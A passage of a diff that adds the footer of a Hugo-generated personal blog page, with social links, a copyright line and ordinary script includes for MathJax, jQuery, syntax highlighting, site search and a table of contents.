+    <li><a href="https://github.com/naivekun" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="https://naivekun.com/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+</ul>
+  <div class="copyright">
+    &copy;&nbsp;2018  -
+    2021
+    <div class="publishby">
+        Theme by naivekun base on<a href="https://github.com/xiaoheiAh/hugo-theme-pure" target="_blank"> pure</a>.
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/python.min.js" defer></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/javascript.min.js" defer></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://naivekun.com/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
+<script src="https://naivekun.com/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            ROOT_URL: 'https:\/\/naivekun.com',
+            CONTENT_URL: 'https:\/\/naivekun.com\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://naivekun.com/js/insight.min.a343cd9a5a7698336b28ef3a7c16a3a1b1d2d5fb17dc8ed04022bbe08cc5459073a15bdafa3a8a58cdd56080784bdd69fa70b1ae8597565c799c57ed00f0e120.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+  </body>
+</html>
